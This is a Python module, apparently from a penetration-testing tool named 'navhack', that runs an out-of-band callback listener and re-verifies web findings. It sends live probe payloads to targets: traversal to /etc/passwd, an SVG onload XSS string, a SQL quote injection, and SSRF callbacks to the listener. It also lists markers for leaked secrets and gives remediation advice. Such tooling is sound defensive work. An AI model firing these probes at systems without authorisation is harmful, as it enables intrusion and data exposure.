"""Out-of-band listener and proof checks.

A finding is only promoted to ``confirmed`` when a check produces evidence that
does not depend on the target telling the truth: an OOB callback, a marker
string, a differential, or a hash of retrieved content.

The OOB server binds loopback by default (works on Termux and offline).  For a
remote target set ``--oob-public host:port`` so the payload points at a
reachable address; ``navhack oob` prints the exact URL to use.
"""

from __future__ import annotations

import hashlib
import socket
import threading
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, List, Optional

from . import httpio, platform_compat as plat, util
from .models import Finding
from .policy import Policy


@dataclass
class Proof:
    ok: bool
    detail: str = ""
    evidence: str = ""
    digest: str = ""

    def sealed(self) -> "Proof":
        material = ("%s|%s|%s" % (self.ok, self.detail, self.evidence)).encode("utf-8")
        self.digest = hashlib.sha256(material).hexdigest()
        return self


class _Handler(BaseHTTPRequestHandler):
    server_version = "navhack-oob"

    def do_GET(self) -> None:  # noqa: N802
        self._record()

    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("content-length") or 0)
        body = self.rfile.read(min(length, 65536)) if length else b""
        self._record(body)

    def _record(self, body: bytes = b"") -> None:
        token = (self.path or "/").strip("/").split("/")[0] or "root"
        owner: "OOB" = self.server.owner  # type: ignore[attr-defined]
        owner.hits.append(
            {
                "token": token,
                "path": self.path,
                "method": self.command,
                "remote": self.client_address[0] if self.client_address else "",
                "headers": util.mask_headers(self.headers.items()),
                "body": body.decode("utf-8", "replace")[:2048],
                "at": util.now_iso(),
            }
        )
        owner.notify(token)
        payload = b"navhack-ok"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, fmt: str, *args) -> None:  # keep stdout clean
        return


class OOB:
    def __init__(self, bind_host: str = "127.0.0.1", port: int = 0, public: str = ""):
        self.bind_host = bind_host
        self.public = public
        self.hits: List[Dict[str, object]] = []
        self._cond = threading.Condition()
        self._server: Optional[ThreadingHTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self.port = port

    def start(self) -> str:
        server = ThreadingHTTPServer((self.bind_host, self.port), _Handler)
        server.daemon_threads = True
        server.owner = self  # type: ignore[attr-defined]
        self._server = server
        self.port = int(server.server_address[1])
        self._thread = threading.Thread(target=server.serve_forever, name="navhack-oob", daemon=True)
        self._thread.start()
        return self.base_url()

    def base_url(self) -> str:
        if self.public:
            base = self.public
            return base if base.startswith("http") else "http://" + base
        host = self.bind_host
        if ":" in host:
            return "http://[%s]:%d" % (host, self.port)
        return "http://%s:%d" % (host, self.port)

    def token_url(self, token: Optional[str] = None) -> str:
        return "%s/%s" % (self.base_url().rstrip("/"), token or util.token(8))

    def notify(self, token: str) -> None:
        with self._cond:
            self._cond.notify_all()

    def wait(self, token: str, timeout: float = 10.0) -> Optional[Dict[str, object]]:
        deadline_reached = False
        end = util.utcnow().timestamp() + timeout
        while not deadline_reached:
            for hit in list(self.hits):
                if hit.get("token") == token:
                    return hit
            remaining = end - util.utcnow().timestamp()
            if remaining <= 0:
                return None
            with self._cond:
                self._cond.wait(min(remaining, 0.5))
        return None

    def stop(self) -> None:
        if self._server is not None:
            try:
                self._server.shutdown()
                self._server.server_close()
            except Exception:
                pass
        self._server = None

    def describe(self) -> Dict[str, object]:
        return {
            "url": self.base_url(),
            "bind": "%s:%d" % (self.bind_host, self.port),
            "public": bool(self.public),
            "loopback_only": not self.public,
            "hits": len(self.hits),
        }

    def __enter__(self) -> "OOB":
        self.start()
        return self

    def __exit__(self, *exc_info) -> None:
        self.stop()


def reachable_from_target(url: str) -> bool:
    """Telnet-style sanity check of our own listener (same host, not the target)."""
    parsed = util.parse_target(url)
    try:
        with socket.create_connection((parsed["host"], parsed["port"]), timeout=3):
            return True
    except OSError:
        return False


MARKERS = {
    "file_read": ["root:x:0:0", "daemon:x:1:1", "[boot loader]"],
    "lfi": ["root:x:0:0", "daemon:x:1:1"],
    "sqli": [
        "SQL syntax",
        "mysql_fetch",
        "ORA-01756",
        "PostgreSQL",
        "unclosed quotation mark",
        "SQLite/JDBCDriver",
    ],
    "open_redirect": ["302", "301"],
}

DEFAULT_REMEDIATION = {
    "file_read": "Restrict path resolution to an allowlist and normalise after decoding.",
    "file_write": "Validate extension and content type server-side; store uploads outside the webroot or without execute rights.",
    "rce": "Patch the entry point, disable unused modules, and run the service as a low-privilege user.",
    "xss": "Context-aware output encoding plus a strict Content-Security-Policy.",
    "sqli": "Parameterised queries everywhere; least-privilege database accounts.",
    "lfi": "Resolve to a canonical path and reject traversal after decoding.",
    "ssrf": "Allowlist egress destinations; block link-local and metadata ranges by default.",
    "exposure": "Remove the artefact from the webroot or gate it behind auth.",
    "auth_bypass": "Enforce authorisation server-side on every route, not just in the UI.",
    "default_cred": "Force a credential change at first login; disable default accounts.",
}


def verify_finding(
    finding: Finding,
    *,
    policy: Policy,
    oob: Optional[OOB] = None,
    timeout: float = 10.0,
) -> Proof:
    """Re-run a targeted, non-destructive proof for one finding."""
    primitive = (finding.primitive or "").lower()
    target = finding.target
    if not target:
        return Proof(False, "finding has no target URL").sealed()

    try:
        if primitive in ("ssrf", "open_redirect") and oob is not None:
            token = util.token(6)
            callback = oob.token_url(token)
            probe_url = util.with_query(target, url=callback, next=callback)
            response = httpio.get(probe_url, policy=policy, timeout=timeout, allow_redirects=False)
            hit = oob.wait(token, timeout=timeout)
            if hit:
                return Proof(
                    True,
                    "OOB callback from %s" % hit.get("remote"),
                    util.jdump({"url": probe_url, "hit": hit}),
                ).sealed()
            if primitive == "open_redirect" and response.status in (301, 302, 303, 307, 308):
                location = response.header("location")
                if "http" in location:
                    return Proof(True, "redirect to %s" % location, location).sealed()
            return Proof(False, "no callback (status %s)" % response.status).sealed()

        if primitive in ("file_read", "lfi"):
            payloads = [
                util.with_query(target, file="../../../../etc/passwd"),
                util.with_query(target, path="../../../../etc/passwd"),
                "/etc/passwd" if target.rstrip("/").endswith("/etc/passwd") else target,
            ]
            for probe in payloads:
                response = httpio.get(probe, policy=policy, timeout=timeout)
                body = response.text
                for marker in MARKERS["file_read"]:
                    if marker in body:
                        excerpt = body[max(0, body.find(marker) - 40) : body.find(marker) + 160]
                        return Proof(True, "marker %r in response" % marker, excerpt).sealed()
            return Proof(False, "no file marker in response").sealed()

        if primitive == "exposure":
            response = httpio.get(target, policy=policy, timeout=timeout)
            body = response.text
            for marker in ("[core]", "DB_PASSWORD", "SECRET_KEY", "<?php", "s3cr3t"):
                if marker in body:
                    return Proof(
                        True, "signature %r with status %d" % (marker, response.status), body[:600]
                    ).sealed()
            if response.status == 200 and len(body) > 0:
                return Proof(
                    True, "200 with %d bytes" % len(body), body[:400]
                ).sealed()
            return Proof(False, "status %d" % response.status).sealed()

        if primitive == "xss":
            payload = 'navhack"><svg/onload=alert(1)>'
            response = httpio.get(util.with_query(target, q=payload), policy=policy, timeout=timeout)
            body = response.text
            if "<svg/onload=alert(1)>" in body:
                return Proof(True, "payload reflected unescaped", payload).sealed()
            if "navhack" in body:
                return Proof(False, "reflected but encoded").sealed()
            return Proof(False, "not reflected").sealed()

        if primitive == "sqli":
            quote = httpio.get(util.with_query(target, id="1%27"), policy=policy, timeout=timeout)
            clean = httpio.get(util.with_query(target, id="1"), policy=policy, timeout=timeout)
            for marker in MARKERS["sqli"]:
                if marker in quote.text and marker not in clean.text:
                    return Proof(True, "DB error only with quote", marker).sealed()
            if abs(len(quote.body) - len(clean.body)) > 60:
                return Proof(False, "length delta only; needs manual confirmation").sealed()
            return Proof(False, "no error signature").sealed()

        response = httpio.get(target, policy=policy, timeout=timeout)
        return Proof(
            response.status > 0,
            "generic reachability: %s" % response.summary(),
            response.text[:300],
        ).sealed()
    except Exception as exc:  # noqa: BLE001 - proof must never crash a run
        return Proof(False, "%s: %s" % (type(exc).__name__, exc)).sealed()


def oob_hint(oob: OOB, target_host: str) -> str:
    """Point out the common Termux/remote mistake early."""
    if oob.public:
        return "OOB reachable at %s" % oob.base_url()
    if target_host in ("127.0.0.1", "localhost", "::1") or util.is_ip(target_host):
        if plat.IS_WINDOWS or True:
            return (
                "OOB bound to loopback; fine for local targets. For remote targets rerun with "
                "--oob-public <your-ip>:<port>"
            )
    return "OOB loopback only; target cannot call back without --oob-public"


__all__ = ["OOB", "Proof", "verify_finding", "reachable_from_target", "oob_hint", "DEFAULT_REMEDIATION"]
